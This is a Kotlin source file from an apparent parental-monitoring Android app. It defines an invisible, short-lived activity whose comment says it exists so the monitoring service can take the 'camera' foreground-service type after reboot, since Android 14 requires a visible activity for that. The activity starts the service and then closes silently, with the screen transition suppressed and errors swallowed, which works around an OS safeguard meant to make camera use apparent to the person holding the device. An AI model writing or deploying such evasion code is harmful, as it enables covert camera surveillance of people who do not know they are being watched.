package com.redeye.parentalmonitor.ui

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import com.redeye.parentalmonitor.service.MonitoringService
import com.redeye.parentalmonitor.utils.ServiceStart

// Jendela transparan tanpa tampilan, hidup ~2 dtk: Android 14+ hanya memasang
// tipe FGS "camera" saat aplikasi punya activity terlihat, jadi jendela ini
// dipakai agar tipe itu bisa dipasang sendiri setelah reboot.
class FgsWakeActivity : Activity() {

    private val mainHandler = Handler(Looper.getMainLooper())
    private val finishRunnable = Runnable { finishQuietly() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestTypeRefresh()
        mainHandler.removeCallbacks(finishRunnable)
        mainHandler.postDelayed(finishRunnable, SAFETY_MS)
    }

    override fun onResume() {
        super.onResume()
        requestTypeRefresh()
        mainHandler.removeCallbacks(finishRunnable)
        mainHandler.postDelayed(finishRunnable, VISIBLE_MS)
    }

    override fun onPause() {
        super.onPause()
        mainHandler.removeCallbacks(finishRunnable)
        mainHandler.postDelayed(finishRunnable, SAFETY_MS)
    }

    override fun onDestroy() {
        super.onDestroy()
        mainHandler.removeCallbacks(finishRunnable)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        requestTypeRefresh()
    }

    private fun requestTypeRefresh() {
        if (!MonitoringService.isRunning) {
            finishQuietly()
            return
        }
        try {
            val intent = Intent(this, MonitoringService::class.java).apply {
                action = MonitoringService.ACTION_REFRESH_FGS
            }
            ServiceStart.startForeground(this, intent)
        } catch (_: Exception) {
        }
    }

    private fun finishQuietly() {
        if (isFinishing || isDestroyed) return
        try {
            @Suppress("DEPRECATION")
            overridePendingTransition(0, 0)
        } catch (_: Exception) {
        }
        try {
            finish()
        } catch (_: Exception) {
        }
    }

    companion object {
        private const val VISIBLE_MS = 2_500L
        private const val SAFETY_MS = 10_000L
    }
}
